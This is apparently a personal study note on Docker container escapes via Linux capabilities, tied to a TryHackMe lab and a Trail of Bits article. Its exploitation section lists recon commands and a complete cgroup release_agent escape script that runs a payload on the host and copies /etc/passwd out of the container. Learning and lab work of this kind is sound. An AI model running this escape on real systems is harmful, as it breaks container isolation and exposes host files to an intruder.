# Linux capabilities in Docker

## Exploitation

- Remote shell to a compromised website
- Run `ls /` to check whether there is a `.dockerenv` file to confirm we are in a docker container
- Run `capsh --print` to list all capabilities, `capsh --print | grep admin` to show which one we can use to exploit
- Commands to mount

```bash
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

echo 1 > /tmp/cgrp/x/notify_on_release

host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

echo "$host_path/exploit" > /tmp/cgrp/release_agent

echo '#!/bin/sh' > /exploit

echo "cat /etc/passwd > $host_path/passwd.txt" >> /exploit

chmod a+x /exploit

sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
```

## Questions

- What is `cgroup`?
- Explain each command

## Reference:

- [Escaping Docker Containers Using Linux Capabilities | TryHackMe The Docker Rodeo](https://www.youtube.com/watch?v=vr7Q5xuX814)
- [Understanding Docker container escapes](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/#:~:text=The%20SYS_ADMIN%20capability%20allows%20a,security%20risks%20of%20doing%20so)
